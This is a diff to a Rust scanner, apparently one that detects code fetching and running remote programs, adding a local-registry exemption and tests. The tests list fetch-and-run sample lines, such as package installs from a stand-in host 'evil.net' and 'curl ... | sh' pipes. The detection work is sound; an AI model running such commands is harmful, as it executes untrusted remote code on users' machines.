@@ -165,6 +165,7 @@ fn compile(pattern: &str) -> Regex {
 /// few lines apart, as in `const res = await fetch(u); eval(await res.text())`.
 const NEARBY_LINES: usize = 12;
 const NEARBY_WINDOW_BYTES: usize = 1200;
+const PACKAGE_MANAGERS: [&str; 7] = ["pip", "npm", "pnpm", "yarn", "bun", "gem", "pip3"];
 /// How close together downloading, saving and starting a program have to be.
 const SAVE_AND_RUN_LINES: usize = 8;
 const SAVE_AND_RUN_BYTES: usize = 800;
@@ -302,6 +303,7 @@ fn add_piped_downloads(file: &RepoFile, report: &mut Report) {
         if gets_its_code_elsewhere
             || is_in_comment(contents, found.start(), file.path.raw())
             || (found.as_bytes().ends_with(b"://") && points_nowhere_real(after))
+            || installs_from_nowhere_real(found.as_bytes())
         {
             continue;
         }
@@ -337,6 +339,20 @@ fn points_nowhere_real(address: &[u8]) -> bool {
     }
     host_of(&format!("https://{address}"))
         .is_some_and(|host| is_local(&host) || is_reserved_host(&host))
+}
+
+/// `pnpm install x --registry http://localhost:4873/` uses this computer's own copy.
+fn installs_from_nowhere_real(found: &[u8]) -> bool {
+    let is_install = PACKAGE_MANAGERS.iter().any(|manager| {
+        found.len() > manager.len()
+            && found[..manager.len()].eq_ignore_ascii_case(manager.as_bytes())
+    });
+    let address = found
+        .windows(3)
+        .rposition(|window| window == b"://")
+        .map(|at| &found[at + 3..]);
+
+    is_install && address.is_some_and(points_nowhere_real)
 }
 
 /// `document.body` and the like aren't the answer to a web request.
@@ -866,11 +882,12 @@ mod tests {
     #[test]
     fn finds_packages_installed_directly_from_an_address() {
         for line in [
-            "pip install https://evil.example/a.whl",
-            "pip3 install git+https://evil.example/a.git",
-            "npm install https://evil.example/a.tgz",
+            "pip install https://evil.net/a.whl",
+            "pip3 install git+https://evil.net/a.git",
+            "npm install https://evil.net/a.tgz",
+            "pnpm install x --registry https://evil.net/",
             "npm i github:evil/a",
-            "yarn add https://evil.example/a.tgz",
+            "yarn add https://evil.net/a.tgz",
             "curl -s https://evil.example/a.tgz | tar xz && ./a/run",
             "await import('https://evil.net/a.js')",
         ] {
@@ -891,6 +908,26 @@ mod tests {
 
             assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
         }
+    }
+
+    #[test]
+    fn installing_from_this_computer_is_not_a_download() {
+        for line in [
+            "pnpm install x --registry http://localhost:4873/",
+            "npm install http://127.0.0.1:8080/a.tgz",
+            "pip install https://example.com/a.whl",
+        ] {
+            let report = scan_text("a.ts", line.as_bytes());
+
+            assert!(report.listed(Kind::DownloadsAndRuns).is_empty(), "{line}");
+        }
+    }
+
+    #[test]
+    fn a_shell_running_a_download_counts_whatever_the_address() {
+        let report = scan_text("a.sh", b"curl https://example.com/i.sh | sh\n");
+
+        assert_eq!(report.listed(Kind::DownloadsAndRuns).len(), 1);
     }
 
     #[test]
